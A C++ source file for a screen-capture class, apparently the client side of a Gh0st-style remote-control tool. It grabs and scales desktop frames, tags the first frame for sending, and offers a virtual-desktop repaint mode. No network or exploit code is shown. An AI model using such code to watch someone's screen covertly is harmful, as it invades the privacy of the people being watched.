// ScreenSpy.cpp: implementation of the CScreenSpy class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ScreenSpy.h"
#include "Common.h"
#include <stdio.h>
#include <common/iniFile.h>

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CScreenSpy::CScreenSpy(ULONG ulbiBitCount, BYTE algo, BOOL vDesk, int gop, BOOL all) :
    ScreenCapture(ulbiBitCount, algo, all)
{
    m_GOP = gop;

    m_BitmapInfor_Full = ConstructBitmapInfo(ulbiBitCount, m_ulFullWidth, m_ulFullHeight);

    iniFile cfg(CLIENT_PATH);
    int strategy = cfg.GetInt("settings", "ScreenStrategy", 0);
    int maxWidth = cfg.GetInt("settings", "ScreenWidth", 0);
    m_BitmapInfor_Send = new BITMAPINFO(*m_BitmapInfor_Full);
    m_nInstructionSet = cfg.GetInt("settings", "CpuSpeedup", 0);

    Mprintf("CScreenSpy: strategy=%d, maxWidth=%d, fullWidth=%d, algo=%d\n",
            strategy, maxWidth, m_BitmapInfor_Send->bmiHeader.biWidth, m_bAlgorithm);

    if (strategy == 1) {
        // strategy=1: 用户明确选择原始分辨率
        Mprintf("CScreenSpy: 使用原始分辨率\n");
    } else if (maxWidth > 0 && maxWidth < m_BitmapInfor_Send->bmiHeader.biWidth) {
        // maxWidth>0: 自定义 maxWidth，等比缩放（自适应质量使用）
        float ratio = (float)maxWidth / m_BitmapInfor_Send->bmiHeader.biWidth;
        m_BitmapInfor_Send->bmiHeader.biWidth = maxWidth;
        m_BitmapInfor_Send->bmiHeader.biHeight = (LONG)(m_BitmapInfor_Send->bmiHeader.biHeight * ratio);
        m_BitmapInfor_Send->bmiHeader.biSizeImage =
            ((m_BitmapInfor_Send->bmiHeader.biWidth * m_BitmapInfor_Send->bmiHeader.biBitCount + 31) / 32) *
            4 * m_BitmapInfor_Send->bmiHeader.biHeight;
        Mprintf("CScreenSpy: 自定义分辨率 %dx%d\n",
                m_BitmapInfor_Send->bmiHeader.biWidth, m_BitmapInfor_Send->bmiHeader.biHeight);
    } else {
        // strategy=0 或 maxWidth=0: 默认 1080p 限制
        m_BitmapInfor_Send->bmiHeader.biWidth = min(1920, m_BitmapInfor_Send->bmiHeader.biWidth);
        m_BitmapInfor_Send->bmiHeader.biHeight = min(1080, m_BitmapInfor_Send->bmiHeader.biHeight);
        m_BitmapInfor_Send->bmiHeader.biSizeImage =
            ((m_BitmapInfor_Send->bmiHeader.biWidth * m_BitmapInfor_Send->bmiHeader.biBitCount + 31) / 32) *
            4 * m_BitmapInfor_Send->bmiHeader.biHeight;
        Mprintf("CScreenSpy: 1080p 限制 %dx%d\n",
                m_BitmapInfor_Send->bmiHeader.biWidth, m_BitmapInfor_Send->bmiHeader.biHeight);
    }

    m_hDeskTopDC = GetDC(NULL);

    m_BitmapData_Full = NULL;
    m_hFullMemDC = CreateCompatibleDC(m_hDeskTopDC);
    m_BitmapHandle	= ::CreateDIBSection(m_hDeskTopDC, m_BitmapInfor_Full, DIB_RGB_COLORS, &m_BitmapData_Full, NULL, NULL);
    ::SelectObject(m_hFullMemDC, m_BitmapHandle);
    m_FirstBuffer = (LPBYTE)m_BitmapData_Full;

    m_DiffBitmapData_Full = NULL;
    m_hDiffMemDC	= CreateCompatibleDC(m_hDeskTopDC);
    m_DiffBitmapHandle	= ::CreateDIBSection(m_hDeskTopDC, m_BitmapInfor_Full, DIB_RGB_COLORS, &m_DiffBitmapData_Full, NULL, NULL);
    ::SelectObject(m_hDiffMemDC, m_DiffBitmapHandle);

    m_RectBuffer = new BYTE[m_BitmapInfor_Full->bmiHeader.biSizeImage * 2 + 12];
    m_BmpZoomBuffer = new BYTE[m_BitmapInfor_Send->bmiHeader.biSizeImage * 2 + 12];
    m_BmpZoomFirst = new BYTE[m_BitmapInfor_Send->bmiHeader.biSizeImage * 2 + 12];
    m_FirstBuffer = scaleBitmap(m_BmpZoomFirst, m_FirstBuffer);

    m_bVirtualPaint = vDesk;
    m_data.Create(m_hDeskTopDC, m_iScreenX, m_iScreenY, m_ulFullWidth, m_ulFullHeight);
}


CScreenSpy::~CScreenSpy()
{
    if (m_BitmapInfor_Full != NULL) {
        delete m_BitmapInfor_Full;
        m_BitmapInfor_Full = NULL;
    }

    ReleaseDC(NULL, m_hDeskTopDC);

    if (m_hFullMemDC!=NULL) {
        DeleteDC(m_hFullMemDC);

        ::DeleteObject(m_BitmapHandle);
        if (m_BitmapData_Full!=NULL) {
            m_BitmapData_Full = NULL;
        }

        m_hFullMemDC = NULL;
    }

    if (m_hDiffMemDC!=NULL) {
        DeleteDC(m_hDiffMemDC);

        ::DeleteObject(m_DiffBitmapHandle);
        if (m_DiffBitmapData_Full!=NULL) {
            m_DiffBitmapData_Full = NULL;
        }
    }

    if (m_RectBuffer) {
        delete[] m_RectBuffer;
        m_RectBuffer = NULL;
    }
}

LPBYTE CScreenSpy::GetFirstScreenData(ULONG* ulFirstScreenLength)
{
    ScanScreen(m_hFullMemDC, m_hDeskTopDC, m_ulFullWidth, m_ulFullHeight);
    m_RectBuffer[0] = TOKEN_FIRSTSCREEN;
    LPBYTE bmp = scaleBitmap(m_BmpZoomBuffer, (LPBYTE)m_BitmapData_Full);
    memcpy(1 + m_RectBuffer, bmp, m_BitmapInfor_Send->bmiHeader.biSizeImage);
    if (m_bAlgorithm == ALGORITHM_GRAY) {
        ToGray(1 + m_RectBuffer, 1 + m_RectBuffer, m_BitmapInfor_Send->bmiHeader.biSizeImage);
    }
    *ulFirstScreenLength = m_BitmapInfor_Send->bmiHeader.biSizeImage;

    return m_RectBuffer;  //内存
}


VOID CScreenSpy::ScanScreen(HDC hdcDest, HDC hdcSour, ULONG ulWidth, ULONG ulHeight)
{
    if (m_bVirtualPaint) {
        // 先用深色填充背景，避免窗口移动时留下残影
        RECT rcFill = { 0, 0, (LONG)ulWidth, (LONG)ulHeight };
        HBRUSH hBrush = CreateSolidBrush(RGB(30, 30, 30));  // 深灰色背景
        FillRect(hdcDest, &rcFill, hBrush);
        DeleteObject(hBrush);

        int n = 0;
        if (n = EnumWindowsTopToDown(NULL, EnumHwndsPrint, (LPARAM)&m_data.SetScreenDC(hdcDest))) {
            Mprintf("EnumWindowsTopToDown failed: %d!!! GetLastError: %d\n", n, GetLastError());
            Sleep(50);
        }
        return;
    }
    AUTO_TICK(70, "");
#if COPY_ALL
    BitBlt(hdcDest, 0, 0, ulWidth, ulHeight, hdcSour, m_iScreenX, m_iScreenY, SRCCOPY);
#else
    const ULONG	ulJumpLine = 50;
    const ULONG	ulJumpSleep = ulJumpLine / 10;

    for (int i = 0, ulToJump = 0; i < ulHeight; i += ulToJump) {
        ULONG  ulv1 = ulHeight - i;

        if (ulv1 > ulJumpLine)
            ulToJump = ulJumpLine;
        else
            ulToJump = ulv1;
        BitBlt(hdcDest, 0, i, ulWidth, ulToJump, hdcSour,0, i, SRCCOPY);
        Sleep(ulJumpSleep);
    }
#endif
}
